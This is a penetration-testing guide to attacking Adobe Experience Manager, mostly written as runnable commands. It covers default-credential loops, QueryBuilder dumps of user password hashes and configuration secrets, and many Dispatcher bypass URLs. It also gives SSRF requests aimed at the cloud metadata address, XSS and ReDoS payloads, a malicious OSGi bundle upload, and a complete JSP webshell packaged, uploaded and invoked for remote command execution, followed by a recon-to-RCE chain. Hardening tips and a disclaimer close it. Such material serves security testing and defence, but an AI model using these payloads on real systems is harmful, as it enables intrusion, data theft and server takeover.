---
title: "Adobe Experience Manager (AEM)"
date: 2026-02-24
draft: false
---

## Overview

Adobe Experience Manager (AEM) is an enterprise content management system widely used by Fortune 500 companies for managing digital marketing content, assets, and websites. It is built on Apache Sling, Apache Felix (OSGi), and uses a JCR (Java Content Repository) backend called Apache Jackrabbit CRX. From a security perspective, AEM is one of the richest targets in enterprise web application testing: default credentials, dozens of exposed servlets, Dispatcher bypass techniques, data extraction via QueryBuilder, and paths to RCE make it a recurring finding in red team engagements.

**Default Ports:**
| Port | Service |
|------|---------|
| 4502 | AEM Author instance (HTTP) |
| 4503 | AEM Publish instance (HTTP) |
| 80 / 443 | Production (via Dispatcher/Apache httpd) |

---

## AEM Architecture Overview

Understanding AEM's architecture is essential for effective testing:

```
Browser → Apache Dispatcher (httpd) → AEM Author (4502) or Publish (4503)
                                    ↓
                               Apache Sling (servlet engine)
                                    ↓
                            Apache Felix / OSGi (module system)
                                    ↓
                            CRX / Jackrabbit (JCR repository)
```

| Component | Role |
|-----------|------|
| Apache Sling | REST-style servlet framework; maps URLs to JCR nodes |
| OSGi / Felix | Module system; bundles deployed as OSGi components |
| CRX / Jackrabbit | JCR content repository; all content stored as nodes |
| Dispatcher | Caching reverse proxy; security filtering layer |
| CRXDE Lite | Web-based IDE for browsing/editing the JCR |
| Felix Web Console | OSGi management console |
| Package Manager | Installs/exports CRX packages (ZIP with JCR content) |

---

## Recon and Fingerprinting

```bash
nmap -sV -p 4502,4503,80,443 TARGET_IP

# AEM fingerprinting
curl -sv http://TARGET_IP:4502/ 2>&1 | grep -iE "server:|aem|adobe|cq5|sling|felix"

# Check for AEM login page
curl -s http://TARGET_IP:4502/libs/granite/core/content/login.html | grep -i "adobe\|aem\|granite"

# Version from manifest
curl -s http://TARGET_IP:4502/system/console/bundles.json 2>/dev/null | python3 -m json.tool | grep -i "version\|aem"

# Built with AEM Sites
curl -s http://TARGET_IP/ | grep -iE "clientlib|jcr_content|_jcr_|sling\."
```

---

## Default Credentials

| Username | Password | Scope |
|----------|----------|-------|
| `admin` | `admin` | Full admin (most common) |
| `author` | `author` | Author-level access |
| `anonymous` | (none) | Public access |
| `replication-receiver` | `replication-receiver` | Replication user |
| `vgnadmin` | `vgnadmin` | Legacy Geometrixx admin |

```bash
# Test default credentials
for cred in "admin:admin" "author:author" "admin:password"; do
  user=$(echo $cred | cut -d: -f1)
  pass=$(echo $cred | cut -d: -f2)
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -u "$user:$pass" \
    "http://TARGET_IP:4502/bin/querybuilder.json?type=dam:Asset&p.limit=1")
  echo "$cred -> $CODE"
done

# Basic auth login
curl -s -u admin:admin http://TARGET_IP:4502/crx/de/index.jsp | grep -i "welcome\|crx"
```

---

## QueryBuilder Data Extraction

AEM's QueryBuilder API (`/bin/querybuilder.json`) allows searching the JCR repository. When accessible (especially via Dispatcher bypasses), it can exfiltrate all content.

### Basic Queries

```bash
# Get all dam:Asset (files/images)
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=dam:Asset&p.limit=-1" | python3 -m json.tool

# Get all pages
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=cq:Page&p.limit=100"

# Get all users
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=rep:User&p.limit=-1"

# Search for password-related nodes
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?fulltext=password&type=nt:unstructured&p.limit=100"

# Get all configuration nodes
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?path=/etc&type=sling:OsgiConfig&p.limit=-1"
```

### Advanced Data Extraction

```bash
# Extract user credentials hash
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=rep:User&p.limit=-1&p.properties=rep:password,rep:authorizableId"

# Export all content paths (structure mapping)
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=nt:base&path=/content&p.limit=-1&p.select=path" | \
  python3 -c "import sys,json; data=json.load(sys.stdin); [print(h.get('path','')) for h in data.get('hits',[])]"

# Get LDAP configuration
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=sling:OsgiConfig&fulltext=ldap&p.limit=10"

# Get DataSource configs (may contain DB credentials)
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=sling:OsgiConfig&fulltext=jdbc&p.limit=10"
```

---

## GQL Endpoint Exposure

```bash
# GQL (Google Query Language adapter) endpoint
curl -s "http://TARGET_IP:4502/bin/wcm/search/gql.json?q=type:cq%3APage%20path:/content&p.limit=100"

# GQL without auth (check if accessible)
curl -s "http://TARGET_IP/bin/wcm/search/gql.json?q=type:cq:Page&p.limit=10"
```

---

## Sling Default Servlets

Apache Sling has several default servlets that can expose data without authentication:

```bash
# .json selector — serialize any JCR node to JSON
curl -s "http://TARGET_IP:4502/content/geometrixx/en.infinity.json"
curl -s "http://TARGET_IP:4502/content/dam.infinity.json"
curl -s "http://TARGET_IP:4502/etc.infinity.json"
curl -s "http://TARGET_IP:4502/home/users.infinity.json"  # User enumeration!

# .xml selector
curl -s "http://TARGET_IP:4502/content/geometrixx/en.xml"

# .tidy.json — formatted output
curl -s "http://TARGET_IP:4502/content/.tidy.json"

# Expose user data
curl -s "http://TARGET_IP:4502/home/users/admin.infinity.json" | python3 -m json.tool

# Check rep:password exposure via JSON
curl -s "http://TARGET_IP:4502/home/users.1.json" | grep -i "rep:password\|pwd"
```

---

## Sensitive Paths

```bash
# CRXDE Lite — full JCR browser and code editor
curl -s -u admin:admin "http://TARGET_IP:4502/crx/de/index.jsp"

# OSGi Felix Console — manage bundles, services, config
curl -s -u admin:admin "http://TARGET_IP:4502/system/console"

# Package Manager — install/export packages
curl -s -u admin:admin "http://TARGET_IP:4502/crx/packmgr/index.jsp"

# Query Builder UI
curl -s -u admin:admin "http://TARGET_IP:4502/libs/cq/search/content/querydebug.html"

# Useradmin — user management
curl -s -u admin:admin "http://TARGET_IP:4502/useradmin"

# DAM admin
curl -s -u admin:admin "http://TARGET_IP:4502/damadmin"

# Site Admin
curl -s -u admin:admin "http://TARGET_IP:4502/siteadmin"

# Content finder
curl -s -u admin:admin "http://TARGET_IP:4502/cf#/"

# AEM Workflow console
curl -s -u admin:admin "http://TARGET_IP:4502/libs/cq/workflow/content/console.html"

# LDAP configuration
curl -s -u admin:admin "http://TARGET_IP:4502/system/console/configMgr"

# Groovy console (if installed)
curl -s "http://TARGET_IP:4502/groovyconsole"
curl -s "http://TARGET_IP:4502/bin/groovyconsole/post"

# Loggers
curl -s -u admin:admin "http://TARGET_IP:4502/system/console/slinglog"
```

---

## Dispatcher Bypass Techniques

The Apache Dispatcher is AEM's caching and security layer. It blocks access to author-side paths. The following bypasses are documented across multiple AEM deployments.

### 1. Classic Path Traversal Bypass

```bash
# The Dispatcher strips path components starting from /../
curl -s "http://TARGET_IP/content/dam./../etc/designs/default/jcr:content/image"
curl -s "http://TARGET_IP/content/./../bin/querybuilder.json?type=rep:User&p.limit=-1"
curl -s "http://TARGET_IP/content/..%2Fbin/querybuilder.json?type=rep:User"
curl -s "http://TARGET_IP/content/dam..%2Fbin/querybuilder.json?type=dam:Asset"
```

### 2. Suffix Bypass

```bash
# Sling allows suffixes after .html
# Dispatcher may only check the first path component
curl -s "http://TARGET_IP/content/dam/jcr:content.html/bin/querybuilder.json?type=rep:User"
curl -s "http://TARGET_IP/content/geometrixx-outdoors/en.html/../../../../bin/querybuilder.json"
curl -s "http://TARGET_IP/any/path.html/WEB-INF/web.xml"
```

### 3. Extension Bypass

```bash
# Append recognized extensions to bypass Dispatcher extension filters
curl -s "http://TARGET_IP/system/console/bundles.json/jcr:content.css"
curl -s "http://TARGET_IP/bin/querybuilder.json.css?type=rep:User"
curl -s "http://TARGET_IP/crx/de/index.jsp/jcr:content.js"
curl -s "http://TARGET_IP/system/console/bundles.json.html"

# Double extension bypass
curl -s "http://TARGET_IP/system/console.css.html"
curl -s "http://TARGET_IP/crx/de.js.html"

# Adding .css or .js suffix
curl -s "http://TARGET_IP/bin/querybuilder.json.css?type=dam:Asset&p.limit=10"
curl -s "http://TARGET_IP/bin/querybuilder.json.js?type=dam:Asset"
```

### 4. :x=x Parameter Bypass

```bash
# Add unknown parameters — some Dispatchers pass through if param added
curl -s "http://TARGET_IP/bin/querybuilder.json?type=rep:User&:x=x"
curl -s "http://TARGET_IP/system/console/bundles.json?:x=x"
curl -s "http://TARGET_IP/crx/de/index.jsp?:x=x"

# Null parameter variant
curl -s "http://TARGET_IP/bin/querybuilder.json?type=rep:User&NULL=0"
```

### 5. GraphQL Endpoint Bypass

The correct Dispatcher bypass for GraphQL uses a semicolon trick: Sling processes the path up to the semicolon (resolving to `/bin/querybuilder.json`), while many Dispatcher rules attempt to match the full string including the GraphQL suffix. If the Dispatcher rule is a string match against `/graphql/execute/json`, the full path `/bin/querybuilder.json;x='x/graphql/execute/json/x'` will not match it, but Sling will execute the querybuilder servlet.

```bash
# Correct semicolon-based GraphQL Dispatcher bypass
curl -s "http://TARGET_IP/bin/querybuilder.json;x='x/graphql/execute/json/x'?type=rep:User&p.limit=-1"

# Direct GraphQL endpoint — may not be covered by Dispatcher rules
curl -s "http://TARGET_IP/graphql/execute.json/ENDPOINT_NAME/QUERY_NAME"

# GraphQL persisted query listing
curl -s "http://TARGET_IP/graphql/execute.json"

# Query all content fragments
curl -s -X POST "http://TARGET_IP/graphql/execute.json" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ contentFragmentList(filter: {}) { items { _path title } } }"}'
```

### 6. Ninja Dispatcher Bypasses

#### Semicolon + URL-Encoded Newline Bypass (Jetty/Sling specific)

```bash
# %0a (URL-encoded newline) as path terminator
curl -s "http://TARGET_IP/bin/querybuilder.json;%0a.css?type=rep:User"
```

Some parsers treat `;` or URL-encoded newline `%0a` as a path terminator, while Sling continues parsing the path normally. Dispatcher rules that match on the suffix or full string will fail to match the encoded payload.

#### Case Insensitivity (Windows AEM hosts)

```bash
# Mixed-case JCR node name — bypasses case-sensitive Dispatcher rules
curl -s "http://TARGET_IP/content/dam/JCR:CONTENT.json"
curl -s "http://TARGET_IP/content/dam/jcr:Content.json"
curl -s "http://TARGET_IP/content/dam/Jcr:content.json"
```

If AEM runs on Windows, JCR node names are case-insensitive (the Windows filesystem is case-insensitive), but Dispatcher filter rules are typically case-sensitive. Mixed-case bypasses filters that block lowercase `jcr:content` while Sling on Windows resolves the node regardless of case.

#### UTF-8 Overlong Encoding

```
%c0%af  (overlong encoding of /)
%c0%ae  (overlong encoding of .)
```

```bash
# Test overlong encoding in path segments for WAF/Dispatcher bypass
curl -s "http://TARGET_IP/bin%c0%afquerybuilder.json?type=rep:User"
curl -s "http://TARGET_IP/%c0%ae%c0%ae/bin/querybuilder.json?type=rep:User"
```

Note: Modern JVMs reject overlong UTF-8 sequences at the HTTP layer, but legacy or misconfigured deployments may still be affected. WAF rules based on decoded paths may also fail to catch these.

### 6. Selector-Based Bypasses

```bash
# Use unusual selectors that Dispatcher may not filter
curl -s "http://TARGET_IP/content/dam.1.json"
curl -s "http://TARGET_IP/content/dam.childrenlist.json"
curl -s "http://TARGET_IP/bin/querybuilder.json.feedcontainer.json"

# Sling Model selectors
curl -s "http://TARGET_IP/content/.model.json"
```

### 7. Apache Rewrite Rule Bypass (Encoded Slashes)

```bash
# AllowEncodedSlashes may be enabled
curl -s "http://TARGET_IP/content/dam%2F..%2Fetc%2Fdesigns"
curl -s "http://TARGET_IP/bin/querybuilder.json%3Ftype=rep:User"

# Double-encoded
curl -s "http://TARGET_IP/content%2Fdam%2F..%2F..%2Fbin%2Fquerybuilder.json?type=rep:User"
```

---

## Forgotten Services and Logic Vulnerabilities

### 1. Search Servlet Abuse

The WCM Search servlet (`/bin/wcm/search/search.json`) is often exposed to support site search functionality and may be accessible without authentication or with minimal access control. It can leak content from non-indexed or access-controlled nodes depending on how the query is constructed.

```bash
# Basic search servlet probe
curl -s "http://TARGET_IP/bin/wcm/search/search.json?q=password&p.limit=100"
curl -s "http://TARGET_IP/bin/wcm/search/search.json?q=*&path=/etc&p.limit=50"

# Search for credentials/config nodes
curl -s "http://TARGET_IP/bin/wcm/search/search.json?q=password&type=sling:OsgiConfig&p.limit=100"

# Dispatcher bypass variant
curl -s "http://TARGET_IP/bin/wcm/search/search.json;%0a.css?q=password&p.limit=100"
```

### 2. External Link Checker SSRF

AEM's built-in link checker service at `/etc/linkchecker.html` validates external URLs referenced in AEM content. If this endpoint is accessible, it can be abused to trigger server-side HTTP requests to internal hosts — a Server-Side Request Forgery (SSRF) vector.

```bash
# Check if link checker is accessible
curl -s "http://TARGET_IP/etc/linkchecker.html"

# Submit internal URL via link checker — SSRF
curl -s -X POST "http://TARGET_IP/etc/linkchecker.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "url=http://169.254.169.254/latest/meta-data/"

# Target internal services
curl -s -X POST "http://TARGET_IP/etc/linkchecker.html" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "url=http://lab.internal:8080/admin/"

# Probe internal network via timing differences
for port in 22 80 443 3306 5432 6379; do
  echo -n "Port $port: "
  curl -s -o /dev/null -w "%{time_total}s" -X POST "http://TARGET_IP/etc/linkchecker.html" \
    --data "url=http://lab.internal:$port/"
  echo
done
```

### 3. Cloud Configuration Takeover

AEM integrates with cloud services (Adobe Launch, Adobe Analytics, AWS S3, Google Analytics) through configurations stored under `/conf` and `/etc/cloudservices`. If these paths are readable via unauthenticated QueryBuilder or CRXDE access, API keys and account IDs can be extracted. A compromised Adobe Launch configuration allows persistent XSS injection into all pages served by AEM, since Launch scripts are loaded on every page.

```bash
# Enumerate cloud service configurations
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?type=cq:CloudServiceConfig&p.limit=-1"

# Read /conf for tenant-specific cloud configs
curl -s -u admin:admin \
  "http://TARGET_IP:4502/conf.infinity.json"

# Read /etc/cloudservices
curl -s -u admin:admin \
  "http://TARGET_IP:4502/etc/cloudservices.infinity.json"

# Target specific services
curl -s -u admin:admin \
  "http://TARGET_IP:4502/etc/cloudservices/analytics.infinity.json"
curl -s -u admin:admin \
  "http://TARGET_IP:4502/etc/cloudservices/launch.infinity.json"

# Search for API key properties
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?fulltext=apiKey&type=nt:unstructured&p.limit=50"
curl -s -u admin:admin \
  "http://TARGET_IP:4502/bin/querybuilder.json?fulltext=clientSecret&type=nt:unstructured&p.limit=50"
```

If Adobe Launch account ID is found, an attacker with account access can inject JavaScript via the Launch UI that will be served on all AEM pages. This constitutes persistent, supply-chain-level XSS.

---

## CVE-2021-21565 — Cross-Site Scripting

**CVSS:** 5.4 Medium
**Affected:** AEM 6.4, 6.5
**Type:** Stored/Reflected XSS in various components

```bash
# Test for XSS in various AEM endpoints
# Reflected XSS via search
curl -s "http://TARGET_IP/bin/wcm/search/gql.json?q=<script>alert(1)</script>"

# XSS via Dispatcher bypass + selector
curl -s "http://TARGET_IP/content/geometrixx/en.html?q=<img src=x onerror=alert(1)>"

# Check if XSS in asset description is rendered
curl -s -u admin:admin \
  -X POST "http://TARGET_IP/content/dam/test.json" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "dc:description=<img src=x onerror=alert(1)>&:operation=import"
```

---

## CVE-2021-40722 — ReDoS

**CVSS:** 7.5 High
**Affected:** AEM 6.4.0 to 6.5.10.0
**Type:** Regular expression Denial of Service

The AEM Forms component was vulnerable to ReDoS in its email validation regex. Sending a specially crafted string could consume excessive CPU and cause denial of service.

```bash
# Test ReDoS via email validation endpoint
# The regex is vulnerable to exponential backtracking on certain inputs
PAYLOAD="aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"

curl -s -X POST "http://TARGET_IP/content/forms/af/your-form/jcr:content.generate.json" \
  -H "Content-Type: application/json" \
  -d "{\"emailField\": \"${PAYLOAD}@${PAYLOAD}@${PAYLOAD}\"}"
```

---

## CVE-2022-30679 — Unauthenticated Asset Download

**CVSS:** 5.3 Medium
**Affected:** AEM 6.5.13 and earlier
**Type:** Missing authorization check on DAM asset download

```bash
# Check if assets in DAM are downloadable without authentication
# First enumerate assets
curl -s "http://TARGET_IP/bin/querybuilder.json?type=dam:Asset&p.limit=10&p.hits=full" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(h.get('jcr:path','')) for h in d.get('hits',[])]"

# Attempt unauthenticated download
curl -s "http://TARGET_IP/content/dam/path/to/asset.pdf" -o test.pdf

# Check DAM download servlet
curl -s "http://TARGET_IP/content/dam/path/to/asset.pdf?asset_id=ASSET_ID"
```

---

## aem-hacker — AEM Security Scanner (0ang3el)

```bash
# Install aem-hacker
git clone https://github.com/0ang3el/aem-hacker.git
cd aem-hacker

# Install dependencies
pip3 install -r requirements.txt

# Run full scan
python3 aem_hacker.py -u http://TARGET_IP:4502/ --host TARGET_IP --port 4502

# Scan production (with Dispatcher)
python3 aem_hacker.py -u https://TARGET_IP/ --host TARGET_IP --port 443 --ssl

# With credentials
python3 aem_hacker.py -u http://TARGET_IP:4502/ -a admin:admin

# Check specific issues
python3 aem_hacker.py -u http://TARGET_IP:4502/ --check-dispatcher-bypass
python3 aem_hacker.py -u http://TARGET_IP:4502/ --check-querybuilder
python3 aem_hacker.py -u http://TARGET_IP:4502/ --check-default-creds

# Output report
python3 aem_hacker.py -u http://TARGET_IP:4502/ -o report.json
```

---

## CRXDE Lite Access

CRXDE Lite is a web-based IDE that allows browsing and editing the entire JCR repository:

```bash
# Access CRXDE
curl -s -u admin:admin "http://TARGET_IP:4502/crx/de/index.jsp"

# JCR API — get any node as JSON
curl -s -u admin:admin "http://TARGET_IP:4502/crx/server/crx.default/jcr:root/etc.json"
curl -s -u admin:admin "http://TARGET_IP:4502/crx/server/crx.default/jcr:root/home.json"
curl -s -u admin:admin "http://TARGET_IP:4502/crx/server/crx.default/jcr:root/home/users.json"

# Get repository info
curl -s -u admin:admin "http://TARGET_IP:4502/crx/server/crx.default/jcr:root.json?":

# Read node properties
curl -s -u admin:admin \
  "http://TARGET_IP:4502/crx/server/crx.default/jcr:root/etc/key.json"
```

---

## OSGi Console Exploitation

The Felix OSGi console at `/system/console` provides full system control:

```bash
# Bundle management
curl -s -u admin:admin "http://TARGET_IP:4502/system/console/bundles.json"

# System information
curl -s -u admin:admin "http://TARGET_IP:4502/system/console/vmstat"

# Configuration manager — can expose/modify all OSGi configs
curl -s -u admin:admin "http://TARGET_IP:4502/system/console/configMgr"

# User manager via Felix
curl -s -u admin:admin "http://TARGET_IP:4502/system/console/jmx"

# Install bundle — RCE via malicious OSGi bundle upload
# Create malicious OSGi bundle (beyond scope here — requires Java OSGi bundle development)
curl -s -u admin:admin \
  -F "action=install" \
  -F "bundlestartlevel=20" \
  -F "bundlefile=@malicious.jar" \
  -F "bundlestart=start" \
  "http://TARGET_IP:4502/system/console/bundles"
```

---

## SlingPostServlet Abuse

Sling's POST servlet handles content creation via HTTP POST:

```bash
# Create arbitrary content nodes
curl -s -u admin:admin \
  -X POST "http://TARGET_IP:4502/content/test_node" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "jcr:primaryType=nt:unstructured&malicious_prop=test"

# Import JSON content
curl -s -u admin:admin \
  -X POST "http://TARGET_IP:4502/content/imported.json" \
  -H "Content-Type: application/json" \
  --data '{"jcr:primaryType":"cq:Page","jcr:content":{"jcr:title":"INJECTED"}}'

# Delete arbitrary content (if permissions allow)
curl -s -u admin:admin \
  -X POST "http://TARGET_IP:4502/content/target_page" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data ":operation=delete"
```

---

## Package Manager Deployment — RCE

The Package Manager (`/crx/packmgr`) allows uploading CRX packages. A malicious package containing a JSP webshell can achieve RCE:

```bash
# Step 1: Create malicious package structure
mkdir -p /tmp/aem_shell/jcr_root/apps/malicious/components/shell
mkdir -p /tmp/aem_shell/META-INF/vault

# Create webshell JSP
cat > "/tmp/aem_shell/jcr_root/apps/malicious/components/shell/shell.jsp" << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line=br.readLine())!=null) sb.append(line).append("\n");
    out.println(sb.toString());
}
%>
EOF

# Create package filter.xml
cat > "/tmp/aem_shell/META-INF/vault/filter.xml" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<workspaceFilter version="1.0">
  <filter root="/apps/malicious"/>
</workspaceFilter>
EOF

# Create properties.xml
cat > "/tmp/aem_shell/META-INF/vault/properties.xml" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd">
<properties>
  <entry key="name">malicious-shell</entry>
  <entry key="group">my_packages</entry>
  <entry key="version">1.0</entry>
  <entry key="description">Shell</entry>
</properties>
EOF

# Package as ZIP
cd /tmp/aem_shell && zip -r /tmp/malicious_shell.zip .

# Step 2: Upload package
curl -s -u admin:admin \
  -F "file=@/tmp/malicious_shell.zip" \
  -F "name=malicious-shell" \
  -F "force=true" \
  -F "install=true" \
  "http://TARGET_IP:4502/crx/packmgr/service.jsp"

# Step 3: Access webshell
curl "http://TARGET_IP:4502/apps/malicious/components/shell/shell.jsp?cmd=id"
```

---

## Nuclei Templates for AEM

```bash
# Run AEM-specific nuclei templates
nuclei -u http://TARGET_IP:4502 -t technologies/adobe-experience-manager.yaml
nuclei -u http://TARGET_IP:4502 -t exposures/configs/aem-default-creds.yaml
nuclei -u http://TARGET_IP:4502 -t cves/2021/CVE-2021-21565.yaml

# Run all AEM tags
nuclei -u http://TARGET_IP -t cves/ -t exposures/ -tags aem,adobe

# Custom check for querybuilder exposure
nuclei -u http://TARGET_IP -t "http/exposures/apis/aem-querybuilder.yaml"
```

---

## Full Attack Chain — Recon to RCE

```
1. Discovery
   ├─ nmap -p 4502,4503,80,443
   ├─ HTTP fingerprinting (Sling headers, error pages)
   └─ Identify Author vs Publish

2. Unauthenticated access check
   ├─ /bin/querybuilder.json (direct + Dispatcher bypass)
   ├─ /system/console (Felix console)
   └─ /crx/de/index.jsp (CRXDE Lite)

3. Dispatcher bypass testing
   ├─ Traversal: /content/..%2Fbin/querybuilder.json
   ├─ Extension: /system/console.css.html
   ├─ Suffix: /content.html/../../../../bin/querybuilder.json
   └─ :x=x parameter

4. Default credential testing
   └─ admin:admin, author:author

5. Data extraction
   ├─ QueryBuilder: dump all dam:Asset, cq:Page, rep:User
   ├─ .infinity.json on /home/users
   └─ CRXDE content browsing

6. RCE paths
   ├─ OSGi console: upload malicious bundle
   ├─ Package Manager: deploy JSP webshell
   └─ Groovy console (if installed)

7. Post-exploitation
   ├─ Extract LDAP/database credentials from OSGi config
   ├─ Access encrypted keystores
   ├─ Pivot to other internal services
   └─ Read application secrets from /etc/key
```

---

## Hardening Recommendations

- Change default admin password immediately post-installation
- Restrict access to author ports (4502/4503) to internal networks only
- Configure Dispatcher to block all paths not explicitly allowed
- Disable CRXDE Lite on production: `CRX DE Lite` OSGi config → disabled
- Disable unnecessary default servlets (`.json`, `.infinity.json` selectors)
- Restrict Package Manager to admin-only and trusted networks
- Apply AEM service packs and CFP updates regularly
- Use AEM's closed user groups (CUG) for content access control
- Disable Geometrixx sample content
- Enable AEM's CSRF token validation for all POST operations
- Implement Web Application Firewall rules targeting AEM-specific attack patterns
- Audit OSGi configurations for stored credentials


---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.